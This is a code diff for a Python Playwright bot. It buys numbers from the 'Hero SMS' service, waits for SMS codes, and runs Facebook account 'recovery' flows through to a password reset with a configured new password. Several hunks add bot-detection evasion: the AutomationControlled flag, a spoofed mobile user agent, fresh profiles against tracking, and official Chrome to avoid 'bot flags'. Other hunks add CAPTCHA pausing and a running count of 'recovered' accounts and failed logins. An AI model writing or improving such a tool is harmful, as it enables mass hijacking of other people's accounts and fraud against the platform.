@@ -56,7 +56,7 @@ def check_stop_flag() -> None:
             pass
         raise KeyboardInterrupt("Stop signal detected")
 
-def update_daily_stats(recovered: int = 0, spent: float = 0.0, duration: int = 0, failed_logins: int = 0) -> None:
+def update_daily_stats(recovered: int = 0, spent: float = 0.0, duration: int = 0, failed_logins: int = 0, success_duration: int = 0) -> None:
     try:
         from datetime import datetime
         import json
@@ -76,17 +76,20 @@ def update_daily_stats(recovered: int = 0, spent: float = 0.0, duration: int = 0
                                 "recovered": int(v),
                                 "spent": 0.0,
                                 "duration": 0,
-                                "failed_logins": 0
+                                "failed_logins": 0,
+                                "success_duration": 0
                             }
                 except:
                     pass
                     
-        entry = data.setdefault(today_str, {"recovered": 0, "spent": 0.0, "duration": 0, "failed_logins": 0})
+        entry = data.setdefault(today_str, {"recovered": 0, "spent": 0.0, "duration": 0, "failed_logins": 0, "success_duration": 0})
         entry["recovered"] += recovered
         entry["spent"] += spent
         entry["duration"] += duration
         entry.setdefault("failed_logins", 0)
         entry["failed_logins"] += failed_logins
+        entry.setdefault("success_duration", 0)
+        entry["success_duration"] += success_duration
         
         with open(stats_path, "w", encoding="utf-8") as f:
             json.dump(data, f, indent=4)
@@ -163,7 +166,9 @@ def is_profile_logged_in(profile_path: str) -> bool:
     return False
 
 
-def generate_next_profile_name(user_data_dir: str = None) -> str:
+def generate_next_profile_name(user_data_dir: str = None, exclude: set = None, force_new: bool = False) -> str:
+    if exclude is None:
+        exclude = set()
     official_path = get_official_chrome_user_data_dir()
     standalone_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles")
     standalone_fb_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles_fb")
@@ -189,33 +194,34 @@ def generate_next_profile_name(user_data_dir: str = None) -> str:
     main_profile = getattr(CONFIG, 'chrome_profile_name', 'Default')
     
     # 1. Proactively check existing profiles to see if we can reuse an empty/logged-out one!
-    for i in sorted(list(existing_profiles)):
-        profile_folder_name = f"Profile {i}"
-        
-        # Never hijack the main profile that is running Hero SMS
-        if profile_folder_name.lower() == main_profile.lower():
-            continue
+    if not force_new:
+        for i in sorted(list(existing_profiles)):
+            profile_folder_name = f"Profile {i}"
             
-        standalone_dir = os.path.join(standalone_path, profile_folder_name)
-        standalone_fb_dir = os.path.join(standalone_fb_path, profile_folder_name)
-        official_dir = os.path.join(official_path, profile_folder_name)
-        
-        is_logged = False
-        if os.path.exists(standalone_dir):
-            is_logged = is_logged or is_profile_logged_in(standalone_dir)
-        if os.path.exists(standalone_fb_dir):
-            is_logged = is_logged or is_profile_logged_in(standalone_fb_dir)
-        if os.path.exists(official_dir):
-            is_logged = is_logged or is_profile_logged_in(official_dir)
-            
-        if not is_logged:
-            # We must also make sure it is not currently open/locked by Chrome
-            lock_file = os.path.join(standalone_fb_dir, "lockfile")
-            if os.path.exists(lock_file):
+            # Never hijack the main profile or excluded profiles
+            if profile_folder_name.lower() == main_profile.lower() or profile_folder_name.lower() in [p.lower() for p in exclude]:
                 continue
                 
-            print(f"ℹ️ Reusing clean existing profile folder: '{profile_folder_name}'")
-            return profile_folder_name
+            standalone_dir = os.path.join(standalone_path, profile_folder_name)
+            standalone_fb_dir = os.path.join(standalone_fb_path, profile_folder_name)
+            official_dir = os.path.join(official_path, profile_folder_name)
+            
+            is_logged = False
+            if os.path.exists(standalone_dir):
+                is_logged = is_logged or is_profile_logged_in(standalone_dir)
+            if os.path.exists(standalone_fb_dir):
+                is_logged = is_logged or is_profile_logged_in(standalone_fb_dir)
+            if os.path.exists(official_dir):
+                is_logged = is_logged or is_profile_logged_in(official_dir)
+                
+            if not is_logged:
+                # We must also make sure it is not currently open/locked by Chrome
+                lock_file = os.path.join(standalone_fb_dir, "lockfile")
+                if os.path.exists(lock_file):
+                    continue
+                    
+                print(f"ℹ️ Reusing clean existing profile folder: '{profile_folder_name}'")
+                return profile_folder_name
 
     # 2. If all existing profiles are occupied, generate a brand new one starting above the highest index
     next_num = max_num + 1
@@ -234,7 +240,7 @@ def generate_next_profile_name(user_data_dir: str = None) -> str:
             return profile_folder_name
         next_num += 1
 
-def launch_and_connect_chrome(p, port: int, profile_name: str, user_data_subdir: str = "chrome_profiles"):
+def launch_and_connect_chrome(p, port: int, profile_name: str, user_data_subdir: str = "chrome_profiles", is_guest: bool = False, is_mobile: bool = False):
     import subprocess
     import sys
     import time
@@ -242,7 +248,13 @@ def launch_and_connect_chrome(p, port: int, profile_name: str, user_data_subdir:
     is_running = is_chrome_running()
     is_standalone = False
     
-    if is_running:
+    if is_guest:
+        # For Guest Mode, we use a single dedicated directory for the chrome process instance
+        user_data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles_fb_guest")
+        os.makedirs(user_data_dir, exist_ok=True)
+        is_standalone = True
+        print(f"Launching Chrome in GUEST MODE on port {port} (User Data: {user_data_dir})...")
+    elif is_running:
         # Each profile gets its own completely isolated User Data Directory to prevent cross-profile tracking
         user_data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), user_data_subdir, profile_name)
         os.makedirs(user_data_dir, exist_ok=True)
@@ -250,44 +262,36 @@ def launch_and_connect_chrome(p, port: int, profile_name: str, user_data_subdir:
         print(f"Chrome is running. Launching standalone profile '{profile_name}' in {user_data_dir}...")
         
         # Sync official profile directory to standalone Default folder for session preservation
-        official_profile_dir = os.path.join(get_official_chrome_user_data_dir(), profile_name)
-        standalone_profile_dir = os.path.join(user_data_dir, "Default")
-        if os.path.exists(official_profile_dir):
-            print(f"Syncing official profile '{profile_name}' to standalone for session preservation...")
-            try:
-                import shutil
-                if os.path.exists(standalone_profile_dir):
-                    shutil.rmtree(standalone_profile_dir)
-                shutil.copytree(official_profile_dir, standalone_profile_dir)
-                print("Profile synced successfully.")
-            except Exception as e:
-                print(f"⚠️ Could not sync official profile: {e}")
+        # Skip syncing for Facebook recovery standalone profiles to ensure they start empty and stay signed out
+        if user_data_subdir != "chrome_profiles_fb":
+            official_profile_dir = os.path.join(get_official_chrome_user_data_dir(), profile_name)
+            standalone_profile_dir = os.path.join(user_data_dir, "Default")
+            if os.path.exists(official_profile_dir):
+                # Only copy official profile if the standalone directory does not exist yet to preserve login sessions!
+                if not os.path.exists(standalone_profile_dir):
+                    print(f"Syncing official profile '{profile_name}' to standalone for session preservation...")
+                    try:
+                        import shutil
+                        shutil.copytree(official_profile_dir, standalone_profile_dir)
+                        print("Profile synced successfully.")
+                    except Exception as e:
+                        print(f"⚠️ Could not sync official profile: {e}")
+                else:
+                    print(f"✨ Standalone profile '{profile_name}' already exists. Preserving existing session cookies (staying logged in).")
+        else:
+            print(f"✨ Facebook recovery standalone session '{profile_name}' will launch completely signed out and fresh.")
     else:
         user_data_dir = get_official_chrome_user_data_dir()
         print(f"Chrome is not running. Launching official profile '{profile_name}'...")
         
-    # Find Playwright's clean bundled Chromium executable first
-    playwright_chrome_path = None
-    try:
-        import glob
-        local_appdata = os.environ.get("LOCALAPPDATA", "")
-        matches = glob.glob(os.path.join(local_appdata, "ms-playwright", "chromium-*", "chrome-win", "chrome.exe"))
-        if matches:
-            playwright_chrome_path = matches[0]
-            print(f"✨ Found Playwright bundled Chromium: {playwright_chrome_path}")
-    except Exception:
-        pass
-        
-    paths = []
-    if playwright_chrome_path:
-        paths.append(playwright_chrome_path)
-    paths.extend([
+    # Prioritize Official Google Chrome over Playwright's clean bundled Chromium to prevent bot flags
+    paths = [
         r"C:\Program Files\Google\Chrome\Application\chrome.exe",
         r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
         os.path.expandvars(r"%LocalAppData%\Google\Chrome\Application\chrome.exe"),
         r"C:\Program Files\Google\Chrome\chrome.exe",
         r"C:\Program Files (x86)\Google\Chrome\chrome.exe",
-    ])
+    ]
     chrome_path = None
     for p_path in paths:
         if os.path.exists(p_path):
@@ -298,18 +302,38 @@ def launch_and_connect_chrome(p, port: int, profile_name: str, user_data_subdir:
         
     close_chrome_on_port(port)
     
-    profile_dir_flag = "Default" if is_running else profile_name
-    cmd = [
-        chrome_path,
-        f"--remote-debugging-port={port}",
-        f"--user-data-dir={user_data_dir}",
-        f"--profile-directory={profile_dir_flag}",
-        "--no-first-run",
-        "--skip-first-run-ui",
-        "--no-default-browser-check",
-        "--disable-features=ProfilePicker",
-        "--disable-features=Translate"
-    ]
+    if is_guest:
+        cmd = [
+            chrome_path,
+            f"--remote-debugging-port={port}",
+            f"--user-data-dir={user_data_dir}",
+            "--guest",
+            "--no-first-run",
+            "--skip-first-run-ui",
+            "--no-default-browser-check",
+            "--disable-features=ProfilePicker",
+            "--disable-features=Translate",
+            "--disable-notifications"
+        ]
+    else:
+        profile_dir_flag = "Default" if is_running else profile_name
+        cmd = [
+            chrome_path,
+            f"--remote-debugging-port={port}",
+            f"--user-data-dir={user_data_dir}",
+            f"--profile-directory={profile_dir_flag}",
+            "--no-first-run",
+            "--skip-first-run-ui",
+            "--no-default-browser-check",
+            "--disable-features=ProfilePicker",
+            "--disable-features=Translate",
+            "--disable-notifications",
+            # Bypasses chromium headless flags and matches normal user-driven windows
+            "--disable-blink-features=AutomationControlled"
+        ]
+    
+    if is_mobile:
+        cmd.append("--user-agent=Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36")
     
     creation_flags = 0
     if sys.platform == 'win32':
@@ -537,6 +561,14 @@ def ensure_menu_expanded(page: Page) -> None:
         if not purchases_btn.is_visible(timeout=1000) and not get_code_btn.is_visible(timeout=500):
             print("📱 Responsive view detected (menu is collapsed). Opening navigation drawer...")
             
+            # Check if there is an active hamburger button explicitly visible
+            menu_btn = page.locator("button.v-btn--icon, button[aria-label*='menu'], button .v-icon--name-menu").first
+            if menu_btn.is_visible(timeout=1000):
+                menu_btn.click()
+                time.sleep(1.2)
+                print("Clicked hamburger menu button.")
+                return
+                
             # Selectors targeting the top left hamburger menu toggle
             menu_btn = page.locator(
                 "button[class*='menu'], button[class*='hamburger'], [class*='toggle-menu'], "
@@ -558,12 +590,57 @@ def ensure_menu_expanded(page: Page) -> None:
         print(f"⚠️ Error opening navigation menu: {e}")
 
 
+def check_and_recover_server_error(page: Page) -> bool:
+    """Detect if Hero SMS threw a 500/505 Server Error, failed i18n load, or crashed, and reload the page."""
+    try:
+        is_error = False
+        
+        # 1. Look for specific i18n translation failures
+        err_not_found = page.get_by_text("NotFoundPage.link", exact=True).first
+        if err_not_found.is_visible(timeout=500):
+            is_error = True
+            
+        # 2. Check if page title is literally "SeoTitle" (translation loading failure)
+        elif page.title() == "SeoTitle":
+            is_error = True
+            
+        # 3. Check for typical server error status codes (500, 502, 503, 504, 505) in headers/titles
+        else:
+            for term in ["500", "502", "503", "504", "505"]:
+                heading = page.locator(f"h1:has-text('{term}'), h2:has-text('{term}'), .text-h1:has-text('{term}'), .text-h2:has-text('{term}')").first
+                if heading.is_visible(timeout=200):
+                    is_error = True
+                    break
+                    
+            if not is_error:
+                # Check for general web server error page titles/headings
+                for error_title in ["502 Bad Gateway", "503 Service Temporarily Unavailable", "504 Gateway Timeout", "500 Internal Server Error", "Internal Server Error", "Gateway Timeout"]:
+                    if page.locator(f"h1:has-text('{error_title}'), title:has-text('{error_title}')").first.is_visible(timeout=100):
+                        is_error = True
+                        break
+        
+        if is_error:
+            print("⚠️ Hero SMS website returned a server error/crashed (500/505/NotFoundPage)! Reloading page...")
+            try:
+                page.reload(wait_until="domcontentloaded", timeout=15000)
+                time.sleep(2.5)
+            except Exception:
+                pass
+            return True
+    except Exception:
+        pass
+    return False
+
+
 def navigate_to_purchases(page: Page) -> bool:
     close_cookies_if_needed(page)
+    check_and_recover_server_error(page)
+    if "purchases" in page.url.lower():
+        return True
     print("\n🔍 Ensuring the 'Purchases' page is visible...")
     ensure_menu_expanded(page)
     try:
-        purchases_btn = page.locator("a:has-text('My purchases'), a:has-text('Purchases'), button:has-text('My purchases')").first
+        purchases_btn = page.locator("a:has-text('My purchases'), a:has-text('Purchases'), button:has-text('My purchases'), a:has-text('nav.number'), a[href*='purchases']").first
         if purchases_btn.is_visible(timeout=2000):
             purchases_btn.click()
             time.sleep(2)
@@ -576,10 +653,11 @@ def navigate_to_purchases(page: Page) -> bool:
 
 def navigate_to_get_code(page: Page) -> bool:
     close_cookies_if_needed(page)
+    check_and_recover_server_error(page)
     print("\n🔍 Ensuring the 'Get code' page is visible...")
     ensure_menu_expanded(page)
     try:
-        get_code_btn = page.locator("a:has-text('Get code'), button:has-text('Get code'), a:has-text('Get SMS'), button:has-text('Get SMS')").first
+        get_code_btn = page.locator("a:has-text('Get code'), button:has-text('Get code'), a:has-text('Get SMS'), button:has-text('Get SMS'), a:has-text('nav.getBtn'), button:has-text('nav.getBtn'), .v-btn:has-text('nav.getBtn')").first
         if get_code_btn.is_visible(timeout=2000):
             get_code_btn.click()
             time.sleep(2)
@@ -699,14 +777,30 @@ def is_placeholder_url(url: str) -> bool:
 
 
 def find_or_open_page(context, url_hint: str) -> Page:
+    matched_page = None
     for page in context.pages:
         if url_hint and not is_placeholder_url(url_hint) and url_hint in page.url:
-            return page
+            matched_page = page
+            break
 
-    page = context.new_page()
-    if not is_placeholder_url(url_hint):
-        page.goto(url_hint, wait_until="domcontentloaded")
-    return page
+    if not matched_page:
+        matched_page = context.new_page()
+        if not is_placeholder_url(url_hint):
+            matched_page.goto(url_hint, wait_until="domcontentloaded")
+            
+    # Clean up any blank/unused startup tabs to keep the browser window clean
+    try:
+        for p in list(context.pages):
+            if p != matched_page:
+                p_url = p.url.lower()
+                if "about:blank" in p_url or "newtab" in p_url or "welcome" in p_url or "profile-picker" in p_url:
+                    if len(context.pages) > 1:
+                        p.close()
+                        print(f"🧹 Closed unused background startup tab: '{p_url}'")
+    except Exception as tab_err:
+        print(f"⚠️ Error cleaning blank tabs: {tab_err}")
+
+    return matched_page
 
 
 def login_if_needed(context) -> None:
@@ -868,18 +962,35 @@ def click_visible_text(page: Page, text: str, timeout_ms: int = 10_000) -> None:
         page.get_by_role("button", name=re.compile(re.escape(text), re.I)),
         page.get_by_role("link", name=re.compile(re.escape(text), re.I)),
         page.get_by_text(re.compile(re.escape(text), re.I)).first,
+        page.locator(f"button:has-text('{text}'), a:has-text('{text}'), div[role='button']:has-text('{text}')").first,
     ]
 
     last_error: Exception | None = None
     for locator in candidates:
         try:
-            locator.click(timeout=timeout_ms)
-            page.wait_for_load_state("networkidle", timeout=timeout_ms)
-            return
+            if locator.is_visible(timeout=2000):
+                try:
+                    locator.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
+                    time.sleep(0.2)
+                except Exception:
+                    pass
+                try:
+                    locator.click(timeout=timeout_ms)
+                except Exception:
+                    try:
+                        locator.click(timeout=timeout_ms, force=True)
+                    except Exception:
+                        locator.evaluate("el => el.click()")
+                try:
+                    page.wait_for_load_state("networkidle", timeout=2000)
+                except Exception:
+                    pass
+                return
         except Exception as exc:
             last_error = exc
 
     raise RuntimeError(f"Could not click visible text {text!r}") from last_error
+
 
 
 def get_top_number(page: Page) -> str:
@@ -994,41 +1105,158 @@ def delete_failed_number(page: Page) -> None:
     pass
 
 
+def check_price_range(btn_element, min_price: float, max_price: float) -> tuple[bool, float]:
+    try:
+        btn_text = btn_element.inner_text().strip()
+        price_match = re.search(r'\$?([0-9]+\.[0-9]+)', btn_text)
+        if price_match:
+            price = float(price_match.group(1))
+            if min_price <= price <= max_price:
+                return True, price
+            else:
+                return False, price
+                
+        # If no price text found in button itself, check parent/surrounding text
+        parent_text = btn_element.locator("xpath=..").inner_text()
+        price_match_parent = re.search(r'\$?([0-9]+\.[0-9]+)', parent_text)
+        if price_match_parent:
+            price = float(price_match_parent.group(1))
+            if min_price <= price <= max_price:
+                return True, price
+            else:
+                return False, price
+    except Exception:
+        pass
+    return True, 0.0
+
+
 def select_service_and_country(page: Page) -> bool:
     close_cookies_if_needed(page)
+    check_and_recover_server_error(page)
     print("\n🤖 Ensuring service and country are selected...")
+    try:
+        # Pre-selection check: see if the target service and country are already selected
+        buy_candidates = []
+        if CONFIG.buy_text:
+            buy_candidates.append(CONFIG.buy_text)
+        buy_candidates.extend(["Buy for $0.099", "Buy for $0.09", "Buy for", "Buy"])
+        
+        buy_btn_visible = False
+        for candidate in buy_candidates:
+            try:
+                btn = page.locator(f"button:has-text('{candidate}'), a:has-text('{candidate}'), div[role='button']:has-text('{candidate}'), .v-btn:has-text('{candidate}')").first
+                if btn.is_visible(timeout=500):
+                    buy_btn_visible = True
+                    break
+            except Exception:
+                pass
+                
+        if not buy_btn_visible:
+            try:
+                regex_btn = page.get_by_role("button", name=re.compile(r"buy", re.I)).first
+                if not regex_btn.is_visible(timeout=500):
+                    regex_btn = page.locator("button, a, div[role='button'], .v-btn").filter(has_text=re.compile(r"buy", re.I)).first
+                if regex_btn.is_visible(timeout=500):
+                    buy_btn_visible = True
+            except Exception:
+                pass
+
+        if buy_btn_visible:
+            # Check if the service and country texts are also visible on the page
+            service_visible = False
+            country_visible = False
+            try:
+                service_visible = page.get_by_text(re.compile(f"^{CONFIG.service_text}$", re.I)).first.is_visible(timeout=500)
+                country_visible = page.get_by_text(re.compile(f"^{CONFIG.country_text}$", re.I)).first.is_visible(timeout=500)
+            except Exception:
+                pass
+                
+            if service_visible and country_visible:
+                print(f"✅ Service '{CONFIG.service_text}' and country '{CONFIG.country_text}' are already selected.")
+                return True
+            else:
+                print("⚠️ Buy button is visible, but service/country selection doesn't match config. Reloading page to reset state...")
+                page.reload(wait_until="domcontentloaded", timeout=15000)
+                time.sleep(2)
+        else:
+            # Even if buy button is not visible, if service card is not visible, it might be in a partially selected state.
+            # Check if the service cards list/elements are visible.
+            try:
+                service_card_visible = page.locator(".service-card, .v-card").first.is_visible(timeout=500)
+                if not service_card_visible:
+                    print("⚠️ Service list is not visible. Reloading page to reset state...")
+                    page.reload(wait_until="domcontentloaded", timeout=15000)
+                    time.sleep(2)
+            except Exception:
+                pass
+    except Exception as e_check:
+        print(f"⚠️ Pre-selection check encountered an issue: {e_check}. Proceeding with fresh selection...")
+
     try:
 
         print(f"Selecting service: {CONFIG.service_text}...")
-        service_btn = page.get_by_text(re.compile(f"^{CONFIG.service_text}$", re.I)).first
+        service_btn = page.locator(f".service-card:has-text('{CONFIG.service_text}'), .v-card:has-text('{CONFIG.service_text}')").first
+        if not service_btn.is_visible(timeout=1500):
+            service_btn = page.get_by_text(re.compile(f"^{CONFIG.service_text}$", re.I)).first
+
+        try:
+            service_btn.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
+            time.sleep(0.3)
+        except Exception:
+            pass
+
         try:
             service_btn.click(timeout=3000)
         except Exception:
-            service_btn.click(timeout=3000, force=True)
+            try:
+                service_btn.click(timeout=3000, force=True)
+            except Exception:
+                service_btn.evaluate("el => (el.closest('.service-card') || el.closest('.v-card') || el).click()")
             
         time.sleep(1.5)
         
         print(f"Selecting country: {CONFIG.country_text}...")
         try:
-            search_input = page.get_by_placeholder(re.compile("country", re.I)).first
-            if search_input.is_visible(timeout=2000):
+            search_input = page.get_by_placeholder(re.compile("country|país", re.I)).first
+            if not search_input.is_visible(timeout=1000):
+                search_input = page.locator("input[placeholder*='Search by country' i], input[placeholder*='country' i], input[placeholder*='país' i]").first
+            
+            if search_input.is_visible(timeout=1500):
+                try:
+                    search_input.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
+                    time.sleep(0.2)
+                except Exception:
+                    pass
+                try:
+                    search_input.click(timeout=1000, force=True)
+                except Exception:
+                    pass
                 search_input.fill(CONFIG.country_text)
-                time.sleep(1)
-        except Exception:
-            pass
+                time.sleep(1.0)
+        except Exception as e_search:
+            print(f"⚠️ Search input lookup skipped: {e_search}")
         
-        # Make the country selector more robust by looking for list items or divs that contain the text
-        country_btn = page.locator(f"li:has-text('{CONFIG.country_text}'), div[role='button']:has-text('{CONFIG.country_text}')").first
-        if not country_btn.is_visible(timeout=2000):
-            # Broader fallback: Just find the text and click it
+        # Target country button - looking for list items or list elements in country drawers first
+        country_btn = page.locator(f"//li[contains(., '{CONFIG.country_text}')] | //div[@role='button' and contains(., '{CONFIG.country_text}')] | //span[contains(text(), '{CONFIG.country_text}')]").first
+        if not country_btn.is_visible(timeout=2500):
+            # Broader fallback: Just find the exact text and click it
             country_btn = page.get_by_text(re.compile(f"^{CONFIG.country_text}$", re.I)).first
             if not country_btn.is_visible(timeout=2000):
-                country_btn = page.locator(f"text='{CONFIG.country_text}'").locator("visible=true").first
+                country_btn = page.locator(f"text='{CONFIG.country_text}'").first
              
+        try:
+            country_btn.evaluate("el => el.scrollIntoView({block: 'center', inline: 'center'})")
+            time.sleep(0.3)
+        except Exception:
+            pass
+
         try:
             country_btn.click(timeout=5000)
         except Exception:
-            country_btn.click(timeout=5000, force=True)
+            try:
+                country_btn.click(timeout=5000, force=True)
+            except Exception:
+                country_btn.evaluate("el => el.click()")
             
         time.sleep(1.5)
         return True
@@ -1037,19 +1265,52 @@ def select_service_and_country(page: Page) -> bool:
         return False
 
 
-def wait_for_sms_code(page: Page, fb_page: Page = None, timeout_sec: int = 180) -> str:
+def wait_for_sms_code(page: Page, phone_number: str = None, fb_page: Page = None, timeout_sec: int = 180, session_stats: dict = None) -> str:
     print(f"\n⏳ Waiting up to {timeout_sec} seconds for SMS code to arrive on Hero SMS...")
-    start_time = time.time()
     
+    # Resolve the correct active Hero SMS tab from context pages (multi-tab support)
+    hero_tab = page
+    try:
+        for p_tab in page.context.pages:
+            p_url = p_tab.url.lower()
+            if ("hero-sms" in p_url or "herosms" in p_url) and "purchases" in p_url:
+                hero_tab = p_tab
+                print("🎯 Found active Purchases tab. Using it for SMS verification.")
+                break
+    except Exception as tab_err:
+        print(f"⚠️ Error checking multi-tab layout: {tab_err}")
+        
+    # Ensure the tab is navigated to the Purchases page to see the active code table
+    try:
+        navigate_to_purchases(hero_tab)
+        time.sleep(1.5)
+    except Exception as nav_err:
+        print(f"⚠️ Could not navigate to purchases page: {nav_err}")
+        
+    start_time = time.time()
     last_refresh_time = start_time
     
     while time.time() - start_time < timeout_sec:
+        # Dynamically scan open tabs to bind to the active Purchases tab if it loads or opens
+        try:
+            for p_tab in page.context.pages:
+                p_url = p_tab.url.lower()
+                if ("hero-sms" in p_url or "herosms" in p_url) and "purchases" in p_url:
+                    if hero_tab != p_tab:
+                        hero_tab = p_tab
+                        print("🎯 Dynamic Tab Switch: Bound to active Purchases page tab.")
+                    break
+        except:
+            pass
+            
         # Check if the Facebook tab in the background has thrown a CAPTCHA verification check
         if fb_page:
             try:
                 captcha_iframe = fb_page.locator("iframe[src*='recaptcha'], iframe[title*='recaptcha'], iframe[src*='captcha'], .g-recaptcha").first
                 captcha_text = fb_page.get_by_text(re.compile("Help us confirm|Confirm it's you|Confirm that it's you", re.I)).first
                 if captcha_iframe.is_visible(timeout=500) or captcha_text.is_visible(timeout=500):
+                    if session_stats is not None:
+                        session_stats["captcha_triggers"] = session_stats.get("captcha_triggers", 0) + 1
                     print("\a\a\a") # Play console alert beeps
                     print("\n🚨🚨🚨 CAPTCHA DETECTED ON FACEBOOK TAB! 🚨🚨🚨")
                     print("🛑 AUTOMATION PAUSED. Bringing Facebook tab to front. Please solve it manually...")
@@ -1059,7 +1320,27 @@ def wait_for_sms_code(page: Page, fb_page: Page = None, timeout_sec: int = 180) 
                     else:
                         captcha_text.wait_for(state="hidden", timeout=300_000)
                     print("✅ CAPTCHA solved! Returning to Hero SMS window to wait for SMS...")
-                    page.bring_to_front()
+                    
+                    # Re-detect the correct active Hero SMS purchases tab if it changed during CAPTCHA pause
+                    try:
+                        for p_tab in page.context.pages:
+                            if ("hero-sms" in p_tab.url.lower() or "herosms" in p_tab.url.lower()) and "purchases" in p_tab.url.lower():
+                                hero_tab = p_tab
+                                break
+                    except:
+                        pass
+                    
+                    try:
+                        if hero_tab and not hero_tab.is_closed():
+                            hero_tab.bring_to_front()
+                    except Exception:
+                        pass
+                    # Immediately force navigate back to Purchases page to restore code table view
+                    try:
+                        navigate_to_purchases(hero_tab)
+                        time.sleep(1.0)
+                    except Exception as nav_err:
+                        print(f"⚠️ Post-captcha navigation failed: {nav_err}")
                     # Reset the start time so the user gets a full 180 seconds wait window starting NOW!
                     start_time = time.time()
                     last_refresh_time = start_time
@@ -1067,33 +1348,82 @@ def wait_for_sms_code(page: Page, fb_page: Page = None, timeout_sec: int = 180) 
             except Exception as ce:
                 # Silently ignore checks to prevent loop crashes
                 pass
+                
+        # Check if the Facebook tab has displayed the "We can't send SMS" toast/banner
+        if fb_page:
+            try:
+                sms_error_indicators = fb_page.get_by_text(re.compile(
+                    r"We can't send SMS to this mobile number|Não podemos enviar um SMS para este número|No podemos enviar un SMS a este número|Não é possível enviar SMS para este número|No se puede enviar un SMS a este número", 
+                    re.I
+                )).first
+                if sms_error_indicators.is_visible(timeout=500):
+                    print("\n❌ Facebook error banner detected: 'We can't send SMS to this mobile number at the moment.'")
+                    raise ValueError("sms_blocked_by_facebook")
+            except ValueError as ve:
+                raise ve
+            except:
+                pass
 
         try:
-            # Read text from table row OR card layout OR body text
-            row = page.locator("tbody tr:first-child, div[class*='card']").first
+            # Find the row containing our phone number suffix using robust digit-based matching in Python
+            matched_row = None
+            if phone_number:
+                clean_pn = ''.join([c for c in phone_number if c.isdigit()])
+                suffix = clean_pn[-8:] if len(clean_pn) >= 8 else clean_pn
+                try:
+                    rows = hero_tab.locator("tbody tr, div[class*='card']").all()
+                    for r in rows:
+                        r_text = r.inner_text()
+                        clean_r_text = ''.join([c for c in r_text if c.isdigit()])
+                        if suffix and suffix in clean_r_text:
+                            matched_row = r
+                            break
+                except Exception as r_err:
+                    pass
+            
+            row = matched_row
+            if not row or not row.is_visible(timeout=800):
+                # Fallback to the first row in the table
+                row = hero_tab.locator("tbody tr:first-child, div[class*='card']").first
+                
             if row.is_visible(timeout=1000):
                 text = row.inner_text(timeout=2000)
             else:
-                text = page.locator("body").inner_text(timeout=2000)
+                text = hero_tab.locator("body").inner_text(timeout=2000)
             
-            if "SMS Code:" in text or "code" in text.lower():
-                match = re.search(r"SMS Code:\s*(\d{5,8})", text, re.I) or re.search(r"code:?\s*(\d{5,8})", text, re.I)
+
+            
+            # Permissive search for any 6-digit code when SMS indicator or code keyword is present
+            if any(k in text.lower() for k in ["sms received", "sms code", "code", "código"]):
+                match = re.search(r"\b(\d{6})\b", text) or re.search(r"SMS Code:\s*(\d{5,8})", text, re.I) or re.search(r"code:?\s*(\d{5,8})", text, re.I)
                 if match:
                     code = match.group(1)
                     print(f"✅ Received SMS Code: {code}")
                     return code
             
-            # Click refresh every ~30 seconds if still waiting
+            # Click refresh or re-navigate every ~30 seconds if still waiting
             if time.time() - last_refresh_time > 30:
                 try:
-                    # The refresh button is usually a circular arrow icon before the X button
-                    refresh_btn = row.locator("button").filter(has=page.locator("svg:not([class*='close'])")).first
-                    if refresh_btn.is_visible():
+                    # The refresh button is usually a circular arrow icon next to the number row
+                    # We query it relative to the row content container to avoid matching header svgs
+                    refresh_btn = row.locator("button").filter(has=row.locator("svg")).first
+                    if refresh_btn.is_visible(timeout=1000):
                         refresh_btn.click(timeout=3000)
                         print("🔄 Clicked refresh icon for the number...")
-                        last_refresh_time = time.time()
-                except Exception:
-                    pass
+                    else:
+                        print("🔄 Refresh icon not found. Reloading page to force SMS update...")
+                        try:
+                            hero_tab.reload(wait_until="domcontentloaded", timeout=10000)
+                        except Exception as rel_err:
+                            print(f"⚠️ Page reload failed: {rel_err}. Trying re-navigation fallback...")
+                            navigate_to_purchases(hero_tab)
+                except Exception as ref_err:
+                    print(f"⚠️ Table refresh failed: {ref_err}. Re-navigating to Purchases...")
+                    try:
+                        navigate_to_purchases(hero_tab)
+                    except:
+                        pass
+                last_refresh_time = time.time()
                     
         except Exception as e:
             # Ignore minor errors while polling (like row not fully loaded)
@@ -1111,11 +1441,37 @@ def handle_post_verification(context, target: Page) -> tuple[str, str]:
     try:
         # We will poll for up to 30 seconds to see where Facebook sends us
         for _ in range(15):
+            # Dismiss overlay modals/popups/dialogs that might dim or block the form
+            try:
+                target.keyboard.press("Escape")
+                
+                # Check for Tutup / Not Now / Lain kali / Jangan sekarang buttons to click
+                close_selectors = [
+                    "button[aria-label*='Close' i]", "[role='button']:has-text('Close' i)",
+                    "button:has-text('Not Now' i)", "[role='button']:has-text('Not Now' i)",
+                    "button:has-text('Tutup' i)", "[role='button']:has-text('Tutup' i)",
+                    "button:has-text('Lain kali' i)", "[role='button']:has-text('Lain kali' i)",
+                    "button:has-text('Jangan sekarang' i)", "[role='button']:has-text('Jangan sekarang' i)",
+                    "button:has-text('Agora não' i)", "[role='button']:has-text('Agora não' i)",
+                    "button:has-text('Tutup' i)", "a:has-text('Tutup' i)", ".layerCancel"
+                ]
+                for sel in close_selectors:
+                    btn = target.locator(sel).first
+                    if btn.is_visible(timeout=100):
+                        btn.click(timeout=1000)
+                        time.sleep(0.5)
+            except:
+                pass
+
             # Scenario 1: Password Reset Page
             try:
                 # Facebook sometimes renders the new password field as type="text" instead of type="password"
                 # so we need to look for specific IDs or names in addition to the type.
-                password_input = target.locator("input[type='password'], input[id*='password'], input[name*='password'], input[placeholder*='New Password' i]").first
+                password_input = target.locator(
+                    "input[type='password'], input[id*='password'], input[name*='password'], "
+                    "input[placeholder*='Password' i], input[placeholder*='Sandi' i], "
+                    "input[placeholder*='Senha' i], input[placeholder*='Contraseña' i]"
+                ).first
                 if password_input.is_visible(timeout=500):
                     print("\n🔑 Password reset required. Setting a new password...")
                     password_to_use = CONFIG.new_password
@@ -1159,13 +1515,23 @@ def handle_post_verification(context, target: Page) -> tuple[str, str]:
